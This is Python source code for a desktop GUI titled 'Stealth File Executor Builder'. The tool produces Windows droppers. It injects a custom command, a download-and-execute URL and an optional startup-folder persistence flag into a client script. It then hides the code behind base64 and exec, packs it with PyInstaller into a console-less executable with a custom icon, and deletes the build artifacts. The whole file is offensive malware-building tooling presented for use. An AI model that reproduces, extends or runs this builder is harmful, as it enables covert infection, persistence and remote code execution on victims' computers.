import dearpygui.dearpygui as dpg
import PyInstaller.__main__
import base64
import shutil
import os


def build_callback():
    custom_command = dpg.get_value("custom_command")
    url_to_download_execute = dpg.get_value("url_to_download_execute")
    copy_to_startup = dpg.get_value("copy_to_startup")

    with open("client.py", "r") as client_file:
        client_code = client_file.read()

    with open("new_client.py", "w") as new_client_file:
        modified_client_code = client_code.replace("custom_command = False", f"custom_command = '{custom_command}'")
        modified_client_code = modified_client_code.replace("download_url = False", f"download_url = '{url_to_download_execute}'")
        modified_client_code = modified_client_code.replace("enable_startup_copy = False", f"enable_startup_copy = {copy_to_startup}")
        new_client_file.write(modified_client_code)

    def encrypt(input_file, output_file):
        with open(input_file, "r") as file:
            text = file.read()

        encoded_text = base64.b64encode(text.encode())

        with open(output_file, "w") as file:
            file.write(f"import base64; exec(base64.b64decode({encoded_text}))")

        dpg.set_value("output_text", "[+] Encrypted file")

    encrypt("new_client.py", "Crypted_new_client.py")
    PyInstaller.__main__.run([
        'Crypted_new_client.py',
        '--onefile',
        '--icon=exe.ico',
        '--noconsole',
        '--hidden-import=subprocess',
        '--hidden-import=requests',
        '--hidden-import=win32api',
        '--hidden-import=win32con',
        '--hidden-import=socket',
        '--hidden-import=shutil',
        '--hidden-import=socket',
        '--hidden-import=time',
        '--hidden-import=os',
    ])
    dpg.set_value("output_text", "[+] Encrypted file\n[+] Builded file")

    if os.path.exists("new_client.py"):
        os.remove("new_client.py")

    if os.path.exists("Crypted_new_client.py"):
        os.remove("Crypted_new_client.py")

    if os.path.exists("build"):
        shutil.rmtree("build")

    if os.path.exists("Crypted_new_client.spec"):
        os.remove("Crypted_new_client.spec")

    if os.path.exists("dist"):
        os.rename("dist/Crypted_new_client.exe", "dist/SFEB.exe")
        shutil.move("dist/SFEB.exe", "./SFEB.exe")
        shutil.rmtree("dist")


def create_main_window():
    with dpg.window(tag="Primary Window"):
        dpg.add_input_text(label="Custom Command to run", width=150, tag="custom_command")
        dpg.add_input_text(label="Direct link to program", width=150,
                           tag="url_to_download_execute")
        dpg.add_checkbox(label="Copy to Startup", tag="copy_to_startup")
        dpg.add_button(label="Build", width=75, callback=build_callback)


def create_output_window():
    with dpg.window(pos=(350, 15), no_collapse=True, no_close=True, no_title_bar=True, no_resize=True):
        dpg.add_input_text(multiline=True, readonly=True, width=200, height=150, tag="output_text")


def set_global_theme():
    with dpg.theme() as global_theme:
        with dpg.theme_component(dpg.mvAll):
            dpg.add_theme_style(dpg.mvStyleVar_WindowRounding, 5)
            dpg.add_theme_style(dpg.mvStyleVar_FrameRounding, 5)
            dpg.add_theme_style(dpg.mvStyleVar_GrabRounding, 5)
            dpg.add_theme_style(dpg.mvStyleVar_TabRounding, 5)
            dpg.add_theme_style(dpg.mvStyleVar_ChildRounding, 5)
            dpg.add_theme_style(dpg.mvStyleVar_PopupRounding, 5)
            dpg.add_theme_style(dpg.mvStyleVar_ScrollbarRounding, 5)
            dpg.add_theme_style(dpg.mvStyleVar_FramePadding, 5, 5)
            dpg.add_theme_style(dpg.mvStyleVar_ItemSpacing, 5, 5)

            dpg.add_theme_color(dpg.mvThemeCol_WindowBg, (21, 22, 23))
            dpg.add_theme_color(dpg.mvThemeCol_FrameBg, (32, 50, 77))
            dpg.add_theme_color(dpg.mvThemeCol_Button, (39, 73, 114))
            dpg.add_theme_color(dpg.mvThemeCol_FrameBg, (32, 50, 77))

    dpg.bind_theme(global_theme)


if __name__ == "__main__":
    dpg.create_context()

    set_global_theme()
    create_main_window()
    create_output_window()

    dpg.create_viewport(title='Stealth File Executor Builder (SFEB-GUI)', width=600, height=200)
    dpg.setup_dearpygui()
    dpg.show_viewport()
    dpg.set_primary_window("Primary Window", True)
    dpg.start_dearpygui()
    dpg.destroy_context()
